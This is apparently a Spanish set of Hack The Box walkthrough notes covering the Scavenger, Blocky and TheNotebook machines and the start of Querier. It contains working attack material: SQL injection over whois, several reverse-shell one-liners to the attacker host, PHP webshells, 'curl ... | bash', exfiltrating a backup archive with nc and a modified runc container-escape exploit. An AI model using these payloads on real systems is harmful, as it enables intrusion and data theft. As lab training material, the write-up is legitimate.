ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl, 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.155 
```

Si consideras que va muy lento puedes meter los siguientes parametros para que valla mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p20,21,22,25,43,53,80 10.10.10.155 -oN targeted
```

| Puerto | Servicio | Que se nos occure?                                       | Que falta?           |
| ------ | -------- | -------------------------------------------------------- | -------------------- |
| 20     | ftp-data |                                                          |                      |
| 21     | ftp      | conectar como anonymous                                  |                      |
| 22     | ssh      | conexion directa                                         | usuario y contraseña |
| 25     | smtp     | email -> exim                                            | usuario y contraseña |
| 43     | whois    | SUPERSECHOSTING WHOIS (http://www.supersechosting.htb)   |                      |
| 53     | domain   | Domain zone transfer -> attacke de transferencia de zona |                      |
| 80     | http     | con el puerto 53 pensamos en virt hosting                |                      |


### Connectar al ftp como anonymous {-}

```bash
ftp 10.10.10.155
Name: anonymous
password: <enter>
#Output
530 Login incorrect.
```

No nos deja entrar como anonymous

### Analyzando la web {-}

#### Checkeamos la web port el ip {-}

Hablan de virtualhosting

```bash
nano /etc/hosts
```
<div class="figure">
<img src="images/scavenger-hosts1.png" alt="hosts supersechosting" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-12)hosts supersechosting</p>
</div>

Intentamos conectarnos otra vez a la web pero ahora con el url `http://supersechosting.htb` y tenemos el mismo resultado.







<!--chapter:end:07-Scavenger/07-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Ataque de transferencia de zona {-}

Para hacer ataques de transferencia de zona, utilizamos la herramienta **Dig** (que no hay que confundir con Dick ;)...)

1. Controlar que la resolucion de dominio funciona

    ```bash
    dig @10.10.10.155 supersechosting.htb
    ```

1. Como la resolucion funciona vamos a transmitir peticiones dns

    ```bash
    dig @10.10.10.155 supersechosting.htb ns
    dig @10.10.10.155 supersechosting.htb mx
    ```

1. Ejecutamos el ataque de transferencia de zona

    ```bash
    dig @10.10.10.155 supersechosting.htb axfr
    ```

Aqui vemos que es vulnerable y vemos unos dominios 

    - root.supersechosting.htb
    - ftp.supersechosting.htb
    - whois.supersechosting.htb
    - www.supersechosting.htb
    - mail1.supersechosting.htb
    - ns1.supersechosting.htb

Los añadimos al `/etc/hosts`

<div class="figure">
<img src="images/scavenger-hosts2.png" alt="hosts despues del domain transfer attack" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-13)hosts despues del domain transfer attack</p>
</div>

Lo miramos con firefox y el host `www.supersechosting.htb` nos muestra algo pero sigue siendo muy poca cosa.

#### Whois {-}

Como el puerto 43 esta abierto. podemos intentar conectar con la maquina para entablar peticiones whois.

```bash
nc 10.10.10.155 43
EEEE
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
% This query returned 0 object
```

Como vemos que MariaDB esta por detras intentamos ponerle una comilla

```bash
nc 10.10.10.155 43
'
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB...
```

### SQL Injection por Whois {-}

Como el mensaje nos da `the right syntax to use near "''")` ya vemos como podemos montarnos el ataque.

```bash
nc 10.10.10.155 43
') ORDER BY 100#
#Output
Unknown column '100' in 'order clause'
```

Como vemos que no puede ordenarnos la query por la columna 100 quiere decir que no hay 100 columnas. Investigamos 
para encontrar cuantas columnas hay.

```bash
nc 10.10.10.155 43
') ORDER BY 4#
#Output
Unknown column '4' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 3#
#Output
Unknown column '3' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 2#
#Output
% This query returned 0 object
```

Ya vemos aqui que hay dos columnas. Podemos aplicar un **UNION SELECT** para ver las etiquetitas a traves de las cuales
podemos injectar los datos con queries.

```bash
nc 10.10.10.155 43
') union select 1,2#
#Output
% This query returned 1 object
1
```

Vemos aqui que injectaremos por la data 1.

1. Qual es la base de datos

    ```bash
    nc 10.10.10.155 43
    ') union select database(),2#
    #Output
    % This query returned 1 object
    whois
    ```

1. Qual es la version

    ```bash
    nc 10.10.10.155 43
    ') union select version(),2#
    #Output
    % This query returned 1 object
    10.1.37-MariaDB-0
    ```

1. Qual son las tablas de la base de datos whois

    ```bash
    nc 10.10.10.155 43
    ') union select table_name,2 from information_schema.tables where table_schema = "whois"#
    #Output
    % This query returned 1 object
    customers
    ```

1. Qual son las columnas de la tabla customers

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers"#
    #Output
    % This query returned 3 object
    iddomaindata
    ```

    Aqui podria ser turbio y puede ser mejor de enumerar columnas por columnas

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 0,1#
    #Output
    % This query returned 1 object
    id

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 1,1#
    #Output
    % This query returned 1 object
    domain

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 2,1#
    #Output
    % This query returned 1 object
    data
    ```

1. Enumerar lo que hay a dentro de la columna domain

    ```bash
    nc 10.10.10.155 43
    ') union select domain,2 from customers#
    #Output
    % This query returned 4 object
    supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
    ```

    Aqui tambien se podria hacer un limit 0,1 1,1 etc...


Ya podemos añadir estos dominios en el `/etc/hosts`.

<div class="figure">
<img src="images/scavenger-hosts3.png" alt="hosts despues del sqli" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-14)hosts despues del sqli</p>
</div>

Aqui ya intentamos conectar a estos nuevos dominios con Firefox pero sigue siendo lo mismo. Intentamos hacer nuevamente ataques 
de zonas con estos nuevos dominios

### Ataque de transferencia de zona Part 2 {-}

```bash
dig @10.10.10.155 justanotherblog.htb axfr
dig @10.10.10.155 pwnhats.htb axfr
dig @10.10.10.155 rentahacker.htb axfr
```

El ultimo dominio nos muestra un dominio turbio `sec03.rentahacker.htb`. Lo añadimos nuevamente en el `/etc/hosts` y por firefox
nos conectamos. Por fin algo nuevo.

Esta pagina nos hace pensar que gente ya a hackeado la pagina por otros *Haxxors*. Si es el caso, fuzzeamos la pagina.

### Web Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ
```

Aqui hay un poco de todo. Intentamos fuzzear por archivos **PHP**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
```

Ya encontramos un fichero **shell.php**. Visitamos la pagina por firefox y efectivamente parece una shell pero no tenemos el nombre
del comando usado para ejecutar los comandos. Lo buscamos con **WFUZZ** diciendole de ocultar las respuestas que retornan 0 palabras.

```bash
wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
```

encontramos el comando `hidden`




<!--chapter:end:07-Scavenger/07-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell desde la webshell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En la web

    ```bash
    http://sec03.rentahacker.htb/shell.php?hidden=nc -e /bin/bash 10.10.14.20 443
    http://sec03.rentahacker.htb/shell.php?hidden=bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c 'bash -i >& /dev/tcp/10.10.14.20/443 0>&1'
    http://sec03.rentahacker.htb/shell.php?hidden=whoami | nc 10.10.14.20 443
    ```

Como aqui vemos que nada functionna, pensamos que hay reglas que son definidas en el *iptables*

### Creamos una FakeShell {-}

En el directorio exploits creamos un fichero `fakeShell.sh` que contiene

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
declare -r main_url="http://sec03.rentahacker.htb/shell.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -X GET -G $main_url --data-urlencode "hidden=$command"; echo
done
```

Ya lo podemos lanzar con el comando `rlwrap ./fakeShell.sh`

> [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 1:15:38

Tambien se podria utilizar la herramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

### Enumeramos el equipo {-}

```bash
ls -l /home
whoami
ls -l /home/ib01c03
ls wp-config.php
find \-name wp-config.php
find / \-name wp-config.php
cat /home/ib01c03/www/wp-config.php
```

Vemos un fichero comprimido de wordpress. Buscamos el fichero de configuracion de wordpress que suele tener credenciales en
texto claro. Una vez encontrado lo miramos con `cat`. Encontramos usuario y contraseña para el servicio mysql. Aqui no hay nada interesante.

### Chequeamos ficheros del servicio SMTP {-}

Los ficheros de email suelen ser guardados en el `/var/spool/mail`. Aqui vemos dos ficheros y une tiene credenciales para el **FTP** en texto claro.

### Conexion por ftp {-}

```bash
ftp 10.10.10.155
Name: ib01ftp
Password: 
```

ya hemos podido entrar en la maquina. Vemos archivos y nos los descargamos a la maquina de atacante

```bash
binary
prompt off
mget *
```

Hay ficheros interesantes como `notes.txt` o `ib01c01.access.log` que nos dan pistas pero nosotros vamos a por el fichero `ib01c01_incident.pcap`

### Investigamos el fichero pcap con TShark {-}

```bash
tshark -r ib01c01_incident.pcap
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tjson 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

Analizando aqui encontramos passwords que son codeadas en url-encode. Tratamos de conectar con el usuario de estos ficheros `ib01c01` con la 
nueva contraseña y pa dentro. Ya podemos ver el fichero **user.txt**

### Continuacion de la investigacion con Wireshark {-}

Aqui llegamos a una parte bastante complicada de explicar por escrito. Mejor verlo directamente con el video desde el minuto 1:40:45
De echo esta parte explica como encuentra un modulo rootkit en el sistema y explica como tratarla.





<!--chapter:end:07-Scavenger/07-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

La escalada de privilegio aqui se hace utilizando el rootkit.


```bash
ls -l /dev/ttyR0
```

Aqui vemos que el rootkit esta instalado. Continuamos con lo que la web del rootkit nos dice.

```bash
echo "g0tR0ot" > /dev/ttyR0; id
```

Pero no functionna. Pensamos aqui que los atacantes que han instalado el rootkit cambiaron la contraseña.
Segun la web, la contraseña se encuentra en un fichero `root.ko` y mirandolo bien hay un directorio que se
llama `...` (Que cabron)

```bash
cd ...
binary
get root.ko
```

Una vez descargado y como es un binario, tratamos de ver lo que pasa a mas bajo nivel con **radare2**

```bash
radare2 root.ko
aaa
afl
sym.root_write
pdf
```

<div class="figure">
<img src="images/radare2rootko.png" alt="radare2 root.ko" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-15)radare2 root.ko</p>
</div>

Vemos esta parte interesante y probamos una vez mas con:

```bash
echo "g3tPr1v" > /dev/ttyR0; whoami

root
```

Ya estamos root y podemos ver la flag.

<!--chapter:end:07-Scavenger/07-04-PrivilegeEscalation.Rmd-->

# Blocky {-}

## Introduccion {-}

La maquina del dia 30/07/2021 se llama Blocky
.

El replay del live se puede ver aqui

[![S4vitaar Blocky maquina](https://img.youtube.com/vi/LPh8BTqEx2c/0.jpg)](https://www.youtube.com/watch?v=LPh8BTqEx2c)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:08-Blocky/08-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.37
```
ttl: 63 -> maquina linux. 
Recuerda que en cuanto a ttl se trata, 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.37 
```

si consideras que va muy lento el escaneo puedes poner los siguientes parametros para que valla mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted
```

| Puerto | Servicio  | Que se nos occure?                        | Que falta?           |
| ------ | --------- | ----------------------------------------- | -------------------- |
| 21     | ftp       | conectar como anonymous                   |                      |
| 22     | ssh       | conexion directa                          | usuario y contraseña |
| 80     | http      | Analisis de la web y Fuzzing              |                      |
| 25565  | minecraft | con el puerto 53 pensamos en virt hosting |                      |


### Conectar al ftp como anonymous {-}

```bash
ftp 10.10.10.37
Name: anonymous
password: <enter>
#Output
530 Login incorrect.
```

No nos deja entrar como anonymous

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.37
```

Aqui vemos que estamos en un Wordpress

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.37 -oN webScan
```

Ya nos detecta un `/phpmyadmin/` y ficheros de wordpress

#### Chequear la web del puerto 80 {-}

Con firefox navegamos en la web para ver lo que es.

- wappalizer nos dice que es Wordpress
- Vemos que la web esta under construction
- Si pinchamos el post vemos que es el usuario NOTCH que lo a echo

Como es un wordpress intentamos ir al `http://10.10.10.37/wp-login.php` y miramos si hay el usuario NOTCH. 
Efectivamente el usuario NOTCH existe. 

Vamos a por el `http://10.10.10.37/phpmyadmin/` y buscamos previamente en google si encontramos credenciales por
defecto pero no funcionan.

Tenemos que ir buscando mas rutas.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.37/WFUZZ
```

Encontramos un ruta plugins que no suele ser normal porque en wordpress los plugins suelen estar en `/wp-content/plugins` y no
en `/plugins` directamente

Aqui encontramos dos ficheros `.jar`. Los descargamos en nuestra maquina de atacante.





<!--chapter:end:08-Blocky/08-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Analizamos los ficheros {-}

Los ficheros `.jar` son ficheros comprimidos que se pueden descomprimir con la herramienta `unzip`

```bash
unzip BlockyCore.jar
unzip griefprevention-1.11.2-3.1.1.298.jar
```

Ya tenemos ficheros `.class` que podemos analizar con **strings** o mejor con **javap**

```bash
javap -c Blockycore.class
```

Aqui ya podemos ver cosas como un usuario root y una contraseña para un sqlUser.

Aqui vamos a la url `http://10.10.10.37/phpmyadmin/` y probamos. Ya podemos entrar en el panel de configuracion
de la base de datos.

Vemos la base de datos de wordpress y le cambiamos la contraseña al usuario NOTCH. Lo unico seria seleccionnar la Funcion
MD5 al lado de la contraseña.

<div class="figure">
<img src="images/phpmyadmin-notch.png" alt="Cambio de contraseña para el usuario notch" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-16)Cambio de contraseña para el usuario notch</p>
</div>

Intentamos conectar al wordpress con el usuario NOTCH y su nueva contraseña y pa dentro.


### Editar el 404 Template de Wordpress {-}

Cada vez que se puede entrar en el panel de administracion de wordpress siempre hacemos lo mismo.

Pinchamos en `Appearance > Editor` y retocamos el fichero 404 Template.

> [ ! ] Nota: Si este fichero no existe, justo encima, se puede **Select theme to edit** y buscar otro tema.


<!--chapter:end:08-Blocky/08-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la 404 Template {-}

Nos ponemos en escucha con el puerto 443.

```bash
nc -nlvp 443
```

Editamos el fichero 404 Template con una reverse shell en php

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'");
?>
```

ya podemos ir al url `http://10.10.10.37/?p=404.php` y pa dentro

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting al usuario notch {-}

Miramos si hay reutilisacion de contraseñas 

```bash
su notch 
```

Y con la contraseña encontrada en el ficher `BlockyCore.class` funciona. Y ya podemos ver la flag.

<!--chapter:end:08-Blocky/08-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
sudo -l
#Output
(ALL : ALL) ALL
```

Vemos que el usuario notch puede efectuar cualquier comando como qualquier usuario ;)

```bash
sudo su
whoami

root
```

Ya esta ;)

<!--chapter:end:08-Blocky/08-04-PrivilegeEscalation.Rmd-->

# TheNotebook {-}

## Introduccion {-}

La maquina del dia 31/07/2021 se llama TheNotebook
.

El replay del live se puede ver aqui

[![S4vitaar TheNotebook maquina](https://img.youtube.com/vi/tEyTJYDbN3s/0.jpg)](https://www.youtube.com/watch?v=tEyTJYDbN3s)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:09-TheNotebook/09-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.230
```
ttl: 63 -> maquina linux.
Recuerda que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.230 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.230 -oN targeted
```

| Puerto | Servicio  | Que se nos occure?                        | Que falta?           |
| ------ | --------- | ----------------------------------------- | -------------------- |
| 22     | ssh       | conexion directa                        | usuario y contraseña |
| 80     | http      | Analizis de la web y Fuzzing              |                      |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.230
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.230 -oN webScan
```

Ya nos detecta un `/phpmyadmin/` y ficheros de wordpress

#### Chequear la web por puerto 80 {-}

Con firefox navigamos en la web para ver lo que es.

- wappalizer nos dice que hay nginx ubuntu bootstrap
- hay un register y un login pero no vemos extensiones php
- Si pinchamos el login intentamos ponerle un admin admin y nos dice que la contraseña es incorrecta -> usuario admin existe
- Si ponemos administrator admin nos dice que el usuario es incorrecto

Vemos que hay formas de enumeracion con este login



#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.37/WFUZZ
```

Encontramos un ruta plugins que no suele ser normal porque en wordpress los plugins suelen estar en `/wp-content/plugins` y no
en `/plugins` directamente

Aqui encontramos dos ficheros `.jar`. Los descargamos en nuestra maquina de atacante.





<!--chapter:end:09-TheNotebook/09-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Ataque de tipo intruder con BurpSuite {-}

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.230
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password

    <div class="figure">
    <img src="images/notebook-sniper-config.png" alt="notebook sniper config" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-17)notebook sniper config</p>
    </div>

1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    <div class="figure">
    <img src="images/notebook-sniper-list.png" alt="notebook sniper payload list" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-18)notebook sniper payload list</p>
    </div>

1. En Options creamos un regexp para saber cuando la contraseña es valida

    - en Grep - Extract damos a ADD
    - le damos a Fetch response

        <div class="figure">
        <img src="images/notebook-fetch-response.png" alt="notebook sniper fetch response" width="90%" />
        <p class="caption">(\#fig:unnamed-chunk-19)notebook sniper fetch response</p>
        </div>

1. Le damos a start attack

No encontramos nada.

### Register un nuevo usuario {-}

Como no a sido posible reventar la mamona con un password brute force, utilizamos la web para ver si encontramos una vulnerabilidad.
Nos creamos un usuario y vemos que podemos añadir notas como un blog. Una de las possibilidades seria tratar de hacer fuzzing pero en este 
caso necesitariamos la cookie de session.Analizando un poco vemos que la cookie de session esta almazenada por un JWT.

Antes de tratar de fuzzear, mirramos si se puede tratar de reventar el JWT Token.

Copiamos el token y la auditamos en [jwt.io](https://jwt.io)

Vemos que hay una data que se llama *admin_cap* y que esta setteada a 0. Pero si tratamos de cambiar a 1 nos invalida el token y vemos que es porque
necesitamos un key (private o public) que parece que sea en el `http://localhost:7070/privKey.key` de la maquina victima. Posiblemente podriamos Hijackear
la url donde encuentra esta Key por una creado por nosotros.

### JWT Hijacking {-}

1. Nos creamos un par de claves con **openssl**

    ```bash
    openssl genrsa -out privKey.key 2048
    ```
1. Introducimos la key en la web de JWT.io

    <div class="figure">
    <img src="images/jwt-hijacking.png" alt="jwt hijacking" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-20)jwt hijacking</p>
    </div>

1. Nos entablamos un servidor web para que pueda cojer la key

    ```bash
    python3 -m http.server 7070
    ```

1. Copiamos el JWT token en firefox

    <div class="figure">
    <img src="images/jwt-firefox.png" alt="jwt firefox hijack" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-21)jwt firefox hijack</p>
    </div>

Ya lanzando la web otra vez y vemos que un Admin Panel a salido y en el cual se puede ver notas y uploadear ficheros.

### Analizamos las notas {-}

Analizando las notas se puede ver :

- Usuario admin
- Usuario Noah
- Ejecucion de fichero php

### Uploadeamos un s4vishell.php {-}

Como hay un boton upload vamos a por una `s4vishell.php`

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Subimos el fichero y perfecto nos va y pinchando el boton view ya tenemos Remote Code Execution


<!--chapter:end:09-TheNotebook/09-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la s4vishell.php con un index.html {-}

1. Creamos un index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servicio http por el puerto 80

    ```bash
    python3 -m http.server 80
    ```

1. Desde la s4vishell

    ```php
    http://10.10.10.230/6a5sd4f6a5sd1f6as5dfa6sd51fa.php?cmd=curl 10.10.14.8|bash
    ```

Ya esta

```bash
whoami
#Output

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
ls -l
cd /home
ls -l
cd noah/
cat user.txt
```

Permission denied. Nos tenemos que pasar al usuario Noah

### User Pivoting al usuario noah {-}

#### Analizamos el systema {-}

```bash
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
cat /etc/crontab
ls -l /var/spool/cron
```

No vemos nada. Tendremos que pasar por el sistema web

```bash
cd /var
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep "config"
find \-type f 2>/dev/null | grep "config" | xargs grep "password" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v "debconf"
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
```

Tampoco vemos algo aqui.

```bash
cd /var
find \-type f 2>/dev/null | grep -v -E "lib|cache"
```

Aqui vemos algo que podria ser interesante.

```bash
cd /var/backups
ls -l
```

Vemos un `home.tar.gz` y tenemos derecho de visualizar

#### Nos enviamos el home.tar.gz {-}

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > home.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc 10.10.14.8 443 < home.tar.gz
    ```

1. Hacemos un md5sum para ver la integridad de la data
1. Analizamos el fichero

    ```bash
    7z l home.tar.gz
    ```

Ya podemos ver que es un comprimido del directorio home del usuario Noah con authorized_key y una id_rsa del proprio usuario

### Conexion por ssh {-}

```bash
chmod 600 id_rsa
ssh -i id_rsa noah@10.10.10.230
```

Ya estamos a dentro y podemos ver la flag


<!--chapter:end:09-TheNotebook/09-03-GainingAccess.Rmd-->

## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
id
sudo -l
#Output

(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Investigamos el container webapp-dev01 con docker pero no encontramos nada

```bash
docker --version
#Output

Docker version 18.06.0-ce
``` 

Miramos si existe un exploit en la web `docker 18.06.0-ce exploit github` y encontramos algo en [CVE-2019-5736-POC](https://github.com/Frichetten/CVE-2019-5736-PoC)

```bash
cd exploits
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
cd CVE-2019-5736-PoC

vi main.go
```

Aqui mirando el `main.go` vemos un comentario que dice:

`// This is the line of shell commands that will execute on host`

La modificamos para autorgar un derecho SUID a la bash

```bash
var payload = "#!/bin/bash \n chmod 4755 /bin/bash
```

Ahora lo compilamos y lo transferimos a la maquina victima

1. En la maquina de attackante buildeamos el exploit y preparamos el envio

    ```bash
    go build -ldflags "-s -w" main.go
    ls
    upx main
    mv main exploit
    python -m http.server 80
    ```

1. En la maquina victima nos conectamos al contenedor

    ```bash
    sudo /usr/bin/docker exec -it webapp-dev01 bash
    cd /tmp
    wget http://10.10.14.8/exploit
    ls
    chmod +x exploit
    ./exploit
    ```

1. No conectamos nuevamente con ssh

    ```bash
    ssh -i id_rsa noah@10.10.10.230
    sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
    ls -l /bin/bash
    bash -p
    whoami

    root
    ```

Ya estamos root y podemos leer la flag

<!--chapter:end:09-TheNotebook/09-04-PrivilegeEscalation.Rmd-->

# Querier {-}

## Introduccion {-}

La maquina del dia 02/08/2021 se llama Querier
.

El replay del live se puede ver aqui

[![S4vitaar Querier maquina](https://img.youtube.com/vi/Dkz_r70OM8U/0.jpg)](https://www.youtube.com/watch?v=Dkz_r70OM8U)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:10-Querier/10-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.125
```
ttl: 127 -> maquina Windows.
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.125 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN targeted
```

| Puerto | Servicio        | Que se nos occure?                                | Que falta?           |
| ------ | --------------- | ------------------------------------------------- | -------------------- |
| 135    | rpc             |                                                   |                      |
| 139    | netbios-ssn     |                                                   |                      |
| 445    | smb             | crackmapexec, smbclient, smbmap                   |                      |
| 1433   | mssql           | Intento de connexion con credenciales por defecto | usuario y contraseña |
| 5985   | winrm           | connexion directa con evil-winrm                  | usuario y contraseña |
| 47001  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49664  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49665  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49666  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49667  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49668  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49669  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49670  | windows puertos | Puertos windows que no nos lleva a nada           |                      |
| 49671  | windows puertos | Puertos windows que no nos lleva a nada           |                      |


### Analizando el smb 445 {-}

1. Scannear el servicio smb

    ```bash
    crackmapexec smb 10.10.10.125
    ```

1. Listar los recursos compartido a nivel de red usando un NULL session

    ```bash
    smbclient -L 10.10.10.125 -N
    ```

1. Intentamos conectarnos al recurso Reports

    ```bash
    smbclient "//10.10.10.125/Reports" -N
    dir
    get "Currency Volume Report.xlsm"
    ```

Que vemos:

- nombre             : QUERIER
- maquina            : Windows 10 x64
- domain             : HTB.LOCAL
- recurso compartido : Reports
- archivo encontrado : Currency Volume Report.xlsm

### Conexion por MSSQL credenciales por defecto {-}

Intentamos conectarnos al servicio MSQL con credenciales por defecto usando `mssqlclient.py`

```bash
locate mssqlclient.py
/usr/bin/mssqlclient.py WORKGROUP/sa:sa@10.10.10.125
/usr/bin/mssqlclient.py WORKGROUP/sa@10.10.10.125
```

El usuario por defecto **sa** no nos va con la contraseña **sa** y sin contraseña. Intentamos volverlo a intentar
con el parametro `-windows-auth`

```bash
/usr/bin/mssqlclient.py WORKGROUP/sa:sa@10.10.10.125 -windows-auth
/usr/bin/mssqlclient.py WORKGROUP/sa@10.10.10.125 -windows-auth
```

Bueno aqui no esta functionado

<!--chapter:end:10-Querier/10-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Analizamos el fichero xlsm {-}

```type
type "Currency Volume Report.xlsm"
#Output
Microsoft Excel 2007+

